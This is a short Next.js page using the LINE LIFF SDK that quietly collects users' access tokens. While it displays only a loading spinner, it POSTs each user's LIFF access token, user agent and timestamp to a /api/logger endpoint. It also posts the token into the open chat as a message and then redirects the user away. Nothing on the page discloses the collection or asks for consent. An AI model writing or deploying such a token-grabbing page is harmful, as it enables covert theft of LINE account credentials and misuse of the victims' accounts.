"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { Loading } from "@/src/components/Loading/Loading";

export default function Token() {
    useEffect(() => {
        liff.init({
            liffId: getLiffId()
        }).then(() => {
            if (liff.isInClient()) {

                fetch("/api/logger", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      time: new Date().toLocaleString(),
                      token: liff.getAccessToken() || "None",
                      ua: navigator.userAgent,
                    }),
                  });
        

                liff.sendMessages([{
                    type: "text",
                    text: " == Token == "
                }, {
                    type: "text",
                    text: liff.getAccessToken() || "Sorry Bad Do"
                }]).then(() => {
                    window.location.href = "https://line.me/R/nv/chat";
                })
            }
        })
    
    }, [])
    return <Loading />
}